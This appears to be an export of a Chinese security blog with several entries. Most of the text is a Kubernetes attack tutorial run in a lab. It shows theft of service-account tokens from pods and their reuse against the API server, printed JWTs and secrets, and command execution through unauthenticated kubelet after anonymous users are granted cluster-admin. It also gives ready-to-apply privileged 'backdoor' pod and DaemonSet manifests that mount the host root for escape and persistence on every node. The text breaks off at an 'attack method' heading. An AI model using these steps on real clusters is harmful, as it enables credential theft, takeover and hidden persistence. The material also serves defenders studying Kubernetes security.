<h2 id="2-Javassist-API和标识符"><a href="#2-Javassist-API和标识符" class="headerlink" title="2. Javassist API和标识符"></a>2. Javassist API和标识符</h2><p><code>Javassist</code>为我们提供了类似于Java反射机制的API，如：<a href="http://www.javassist.org/html/javassist/CtClass.html">CtClass</a>，<a href="http://www.javassist.org/html/javassist/CtConstructor.html">CtConstructor</a>、<a href="http://www.javassist.org/html/javassist/CtMethod.html">CtMethod</a>、<a href="http://www.javassist.org/html/javassist/CtField.html">CtField</a>与Java反射的<code>Class</code>、<code>Constructor</code>、<code>Method</code>、<code>Field</code>非常的类似。</p>
<table>
<thead>
<tr>
<th>类</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ClassPool</td>
<td>ClassPool是一个存储CtClass的容器，如果调用<code>get</code>方法会搜索并创建一个表示该类的CtClass对象</td>
</tr>
<tr>
<td>CtClass</td>
<td>CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作</td>
</tr>
<tr>
<td>CtMethod</td>
<td>可读写的类方法对象</td>
</tr>
<tr>
<td>CtConstructor</td>
<td>可读写的类构造方法对象</td>
</tr>
<tr>
<td>CtField</td>
<td>可读写的类成员变量对象</td>
</tr>
</tbody></table>
<p><code>Javassist</code>使用了内置的标识符来表示一些特定的含义，如：<code>$_</code>表示返回值。我们可以在动态插入类代码的时候使用这些特殊的标识符来表示对应的对象。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0, $1, $2, ...</code></td>
<td><code>this</code>和方法参数</td>
</tr>
<tr>
<td><code>$args</code></td>
<td><code>Object[]</code>类型的参数数组</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>所有的参数，如<code>m($$)</code>等价于<code>m($1,$2,...)</code></td>
</tr>
<tr>
<td><code>$cflow(...)</code></td>
<td>cflow变量</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>返回类型，用于类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装类型，用于类型转换</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>方法返回值</td>
</tr>
<tr>
<td><code>$sig</code></td>
<td>方法签名，返回<code>java.lang.Class[]</code>数组类型</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>返回值类型，<code>java.lang.Class</code>类型</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>当前类，<code>java.lang.Class</code>类型</td>
</tr>
</tbody></table>
<h2 id="3-Javassist读取类信息"><a href="#3-Javassist读取类信息" class="headerlink" title="3. Javassist读取类信息"></a>3. Javassist读取类信息</h2><p>未完待续……</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925">https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925</a></p>
<p><a href="https://fynch3r.github.io/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://fynch3r.github.io/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>xstream漏洞分析</title>
    <url>/xstream%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>道冲而用之或不盈，渊兮似万物之宗</p>
</blockquote>
<p>未完待续……</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>云原生攻击面</title>
    <url>/%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E5%87%BB%E9%9D%A2/</url>
    <content><![CDATA[<blockquote>
<p>一切有为法，如梦幻泡影，如露亦如电，应作如是观。</p>
</blockquote>
<p>对云原生的攻击面做个归纳</p>
<span id="more"></span>



<p>攻击面如下：</p>
<p><img src="../images/pic/%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E5%87%BB%E9%9D%A2.jpg"></p>
<p>容器云部分参考，<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸</a>，<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%B9%B3%E5%8F%B0-Kubernetes%E5%AE%89%E5%85%A8/">容器编排平台-Kubernetes安全</a>，<a href="https://shadowfl0w.github.io/Kubernetes-API-Server-%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/">Kubernetes-API-Server-认证与授权</a></p>
<h2 id="云原生应用风险"><a href="#云原生应用风险" class="headerlink" title="云原生应用风险"></a>云原生应用风险</h2><h3 id="1-传统应用风险"><a href="#1-传统应用风险" class="headerlink" title="1. 传统应用风险"></a>1. 传统应用风险</h3><p>跑在容器云环境下得应用也避免不了OWASP top 10应用风险，</p>
<h3 id="2-API接口风险"><a href="#2-API接口风险" class="headerlink" title="2. API接口风险"></a>2. API接口风险</h3><p>虽然API接口风险也属于传统应用风险，但这个问题在云原生环境下更加突出，因为一个完整的应用被拆分成独立的模块，通过API接口进行交互，由于接口众多，导致管理困难，所有API接口风险是云原生应用的重大风险点</p>
<h3 id="3-Serverless风险"><a href="#3-Serverless风险" class="headerlink" title="3. Serverless风险"></a>3. Serverless风险</h3><p>Serverless应用属于云原生应用，它需要参照云厂商的模板编写代码。Serverless是由事件触发的，但是事件本身来源并不可控。其他的使用的共有或者私有Serverless平台本身也可能存在安全问题，现在很多公有云厂商提供的Serverless服务被用来做攻击，存在滥用的风险，比如用来做扫描，隐藏c2。还有就是编写的Serverless代码可能存在漏洞导致被利用。</p>
<h3 id="4-云原生应用架构安全"><a href="#4-云原生应用架构安全" class="headerlink" title="4. 云原生应用架构安全"></a>4. 云原生应用架构安全</h3><p>云原生应用一般采用微服务架构，微服务架构使用到的各种框架或者组件也是可能存在漏洞的，微服务下对认证和授权也是一大挑战，还有就是微服务的API管理，以及资产间隔离也是难点。</p>
<p>对云原生应用安全只做了简单的结束，后续有机会再详细介绍各种的攻击手法。</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>云原生安全</tag>
      </tags>
  </entry>
  <entry>
    <title>容器编排平台-Kubernetes安全</title>
    <url>/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%B9%B3%E5%8F%B0-Kubernetes%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<blockquote>
<p>有之以为利，无之以为用。</p>
</blockquote>
<span id="more"></span>

<p>Kubernetes是容器编排平台的事实标准，具有较高的复杂性，使用到各种组件，但是组件和本身都可能存在漏洞。下面列举一下Kubernetes使用的组件常见开放端口</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>默认端口</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>API Server</td>
<td>6443</td>
<td>基于HTTPS的安全端口</td>
</tr>
<tr>
<td>API Server</td>
<td>8080</td>
<td>不安全的HTTP端口，不建议启用</td>
</tr>
<tr>
<td>Kubelet</td>
<td>10248</td>
<td>用于检查Kubelet健康状态的HTTP端口</td>
</tr>
<tr>
<td>Dashboard</td>
<td>8001</td>
<td>提供HTTP服务的端口</td>
</tr>
<tr>
<td>etcd</td>
<td>2379</td>
<td>客户端与服务端通信的端口</td>
</tr>
<tr>
<td>etcd</td>
<td>2380</td>
<td>不同服务端实例之间通信的端口</td>
</tr>
</tbody></table>
<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><h3 id="1-1-pod内获K8s-Server-Token"><a href="#1-1-pod内获K8s-Server-Token" class="headerlink" title="1.1 pod内获K8s Server Token"></a>1.1 pod内获K8s Server Token</h3><blockquote>
<p>在Pod内收集token用于横向移动</p>
</blockquote>
<ul>
<li><p>命令：cat /var/run/secrets/kubernetes.io/serviceaccount/token</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl exec -it alpine-test /bin/sh</span></span><br><span class="line">kubectl <span class="built_in">exec</span> [POD] [COMMAND] is DEPRECATED and will be removed <span class="keyword">in</span> a future version. Use kubectl <span class="built_in">exec</span> [POD] -- [COMMAND] instead.</span><br><span class="line">/ <span class="comment"># cat /var/run/secrets/kubernetes.io/serviceaccount/token</span></span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjcyMjgzODA2LCJpYXQiOjE2NDA3NDc4MDYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJhbHBpbmUtdGVzdCIsInVpZCI6IjNmZmY0NGUxLTEzNzUtNGViYi04MzBlLTA3Yjk3MTFlOTE0MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyJ9LCJ3YXJuYWZ0ZXIiOjE2NDA3NTE0MTN9LCJuYmYiOjE2NDA3NDc4MDYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.ncqAGaslig7ut0aSxBpzg6QldCvAOt5E8i-2rB_zf8cq_Yku6n8C0nFvtiR9KzTu9OxWOjjyn7sKr8Q1xAN-S9xHwOxLG_hb-Z8gmz9VfxtM1hRE6h2JeLAZJgfRYjydrQns2JJ-3uZwKN15KNn95emZzTXMbpdhuFZyuiaOV-6q0jHsI9LhOzYczfJQhMUMXDppQzs3WuI8VckIzgjx9BZM0vgwHaNf065ak4FYGKDVNOoYhbl-b6jwaPNz0SFq0r1SUCLKa6Kn5rpcXzdOG2H_r_lTJlfTJyyFKHEmHtiYE2W9dkAk0AgyaNlZmnlr8D0bTwRahnYJ9k2N0hb9ag/ <span class="comment">#</span></span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>成功获取到了token</p>
<p>通过token进行访问API Server。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># curl -k --header &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w&quot; https://172.16.42.100:6443/api</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;APIVersions&quot;</span>,</span><br><span class="line">  <span class="string">&quot;versions&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;v1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;serverAddressByClientCIDRs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;clientCIDR&quot;</span>: <span class="string">&quot;0.0.0.0/0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;serverAddress&quot;</span>: <span class="string">&quot;172.16.42.100:6443&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-2-kubectl-获取-Api-server-token"><a href="#1-2-kubectl-获取-Api-server-token" class="headerlink" title="1.2 kubectl 获取 Api server token"></a>1.2 kubectl 获取 Api server token</h3><ul>
<li><p>命令：kubectl config view</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl config view</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    certificate-authority-data: DATA+OMITTED</span><br><span class="line">    server: https://172.16.42.100:6443</span><br><span class="line">  name: kubernetes</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: kubernetes</span><br><span class="line">    user: kubernetes-admin</span><br><span class="line">  name: kubernetes-admin@kubernetes</span><br><span class="line">current-context: kubernetes-admin@kubernetes</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: kubernetes-admin</span><br><span class="line">  user:</span><br><span class="line">    client-certificate-data: REDACTED</span><br><span class="line">    client-key-data: REDACTED</span><br><span class="line">[root@master ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>获取到Api Server地址：<a href="https://172.16.42.100:6443/">https://172.16.42.100:6443</a></p>
</li>
</ul>
<h3 id="1-3-kubectl-获取Api-Server-token"><a href="#1-3-kubectl-获取Api-Server-token" class="headerlink" title="1.3 kubectl 获取Api Server token"></a>1.3 kubectl 获取Api Server token</h3><ul>
<li><p>命令：kubectl describe secrets</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl describe secrets</span></span><br><span class="line">Name:         default-token-7xts4</span><br><span class="line">Namespace:    default</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: default</span><br><span class="line">              kubernetes.io/service-account.uid: 720096c3-c0ea-4f03-889c-6d450ab62d2c</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">ca.crt:     1066 bytes</span><br><span class="line">namespace:  7 bytes</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-4-pod内判断kubernetes环境"><a href="#1-4-pod内判断kubernetes环境" class="headerlink" title="1.4 pod内判断kubernetes环境"></a>1.4 pod内判断kubernetes环境</h3><ul>
<li><p>命令：<code>env | grep KUBE</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># env | grep KUBE</span></span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">KUBERNETES_PORT=tcp://10.96.0.1:443</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br></pre></td></tr></table></figure></li>
<li><p>命令：<code>cat /etc/resolv.conf</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># cat /etc/resolv.conf</span></span><br><span class="line">nameserver 10.96.0.10</span><br><span class="line">search default.svc.cluster.local svc.cluster.local cluster.local</span><br><span class="line">options ndots:5</span><br></pre></td></tr></table></figure></li>
<li><p>命令：<code>cat /proc/1/mountinfo</code></p>
</li>
</ul>
<h2 id="2-未授权访问攻击"><a href="#2-未授权访问攻击" class="headerlink" title="2. 未授权访问攻击"></a>2. 未授权访问攻击</h2><h3 id="2-1-Kubernetes-API-Server未授权访问"><a href="#2-1-Kubernetes-API-Server未授权访问" class="headerlink" title="2.1 Kubernetes API Server未授权访问"></a>2.1 Kubernetes API Server未授权访问</h3><p><strong>老版本中：</strong></p>
<p>默认情况，Kubernetes API Server提供HTTP的两个端口：</p>
<p>1）本地主机端口</p>
<ul>
<li>HTTP服务</li>
<li>默认端口8080，修改标识–insecure-port</li>
<li>默认IP是本地主机，修改标识—insecure-bind-address</li>
<li>在HTTP中没有认证和授权检查</li>
<li>主机访问受保护</li>
</ul>
<p>2）Secure Port</p>
<ul>
<li>默认端口6443，修改标识—secure-port</li>
<li>默认IP是首个非本地主机的网络接口，修改标识—bind-address</li>
<li>HTTPS服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file</li>
<li>认证方式，令牌文件或者客户端证书</li>
<li>使用基于策略的授权方式</li>
</ul>
<p><strong>新版本中：</strong></p>
<p>只用默认的6443端口，并且不开启HTTP服务。</p>
<p>如果接口未授权访问则如下</p>
<p><img src="../images/pic/k8s8.jpg"> </p>
<h3 id="2-2-Kubernetes-Dashboard未授权访问"><a href="#2-2-Kubernetes-Dashboard未授权访问" class="headerlink" title="2.2 Kubernetes Dashboard未授权访问"></a>2.2 Kubernetes Dashboard未授权访问</h3><p>Kuberntetes Dashboard是一个基于Web的Kubernetes用户界面。我们可以用它来在集中部署、调试容器化应用，或者管理集群资源。</p>
<p>Dashboard需要配置token才能访问，在1.10.1版本之前提供了跳过选项可以直接访问。</p>
<p>如下高版本中必须提供token才能登录</p>
<p><img src="../images/pic/k8s9.jpg"></p>
<h3 id="2-3-Kubelet未授权访问"><a href="#2-3-Kubelet未授权访问" class="headerlink" title="2.3 Kubelet未授权访问"></a>2.3 Kubelet未授权访问</h3><p>每一个Node节点都有一个kubelet服务，kubelet监听了10250，10248，10255等端口。</p>
<p>其中10250端口是kubelet与apiserver进行通信的主要端口，通过该端口kubelet可以知道自己当前应该处理的任务，该端口在最新版Kubernetes是有鉴权的，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用10250提供的能力；因为Kubernetes流行早期，很多挖矿木马基于该端口进行传播和利用，所以该组件在安全领域部分群体内部的知名度反而会高于 APIServer。</p>
<p>在新版本Kubernetes中当使用以下配置打开节点匿名访问时便可能存在kubelet未授权访问漏洞：</p>
<p><img src="../images/pic/k8s10.png" alt="image-20211029170007795"> </p>
<p>systemctl restart kubectl</p>
<p>master节点执行：kubectl create clusterrolebinding the-boss –user system:anonymous –clusterrole cluster-admin</p>
<p>查看pods:</p>
<p>curl –insecure <a href="https://172.16.42.101:10250/pods">https://172.16.42.101:10250/pods</a></p>
<p>根据容器信息执行命令：curl -k <a href="https://172.16.42.101:10250/run/namespace/name/metadata-name/container-name">https://172.16.42.101:10250/run/namespace/name/metadata-name/container-name</a> -d “cmd=id”</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -k https:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.101</span>:<span class="number">10250</span><span class="regexp">/run/</span>default<span class="regexp">/nginx/</span>nginx -d <span class="string">&quot;cmd=id&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s11.png" alt="image-20211029173138156"> </p>
<p><code>curl -k https://172.16.42.101:10250/run/default/kibana-577d8c75d6-pgw5p/kibana -d &quot;cmd=id&quot;</code></p>
<h2 id="3-后门pod"><a href="#3-后门pod" class="headerlink" title="3. 后门pod"></a>3. 后门pod</h2><p>如果我们拥有可以创建Pod的权限，那么我们就可以部署Pod后门。</p>
<h3 id="3-1-特权容器pod"><a href="#3-1-特权容器pod" class="headerlink" title="3.1 特权容器pod"></a>3.1 特权容器pod</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">shadowtest</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">creator:</span> <span class="string">shadowflow</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostIPC:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">nodeSelector:</span></span><br><span class="line">    <span class="comment"># kubernetes.io/hostname 需要先查看 pod 所在的节点进行修改</span></span><br><span class="line">    <span class="comment"># kubectl get pods -o wide -A</span></span><br><span class="line">    <span class="comment"># kubernetes.io/hostname:  k8s-node1</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">trpc</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;alpine&quot;</span></span><br><span class="line">    <span class="comment"># imagePullPolicy: &quot;Never&quot;</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">add:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dev</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/host/dev</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/host/proc</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sys</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/host/sys</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/near_sandbox</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/proc</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dev</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/dev</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sys</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/sys</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>使用如下命令即可部署</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">apply</span> -f node_shell.yaml</span><br></pre></td></tr></table></figure>

<p>攻击方式：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">create</span> -f node_shell.yaml</span><br><span class="line">kubectl exec -<span class="keyword">it</span> -f node_shell.yaml <span class="comment">-- sh</span></span><br><span class="line">chroot /near_sandbox/</span><br></pre></td></tr></table></figure>



<p>部署成功后的利用方式跟特权容器逃逸是一样的，可以参考：<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a></p>
<h3 id="3-2-Daemonset后门Pod"><a href="#3-2-Daemonset后门Pod" class="headerlink" title="3.2 Daemonset后门Pod"></a>3.2 Daemonset后门Pod</h3><p>aemonset后门会在每个Node上部署一个后门</p>
<p>从 v1.16 开始, 用 apps/v1 代替 extensions/v1beta1</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_PTRACE</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">AUDIT_CONTROL</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">MKNOD</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SETFCAP</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">/near_sandbox</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>攻击方式</p>
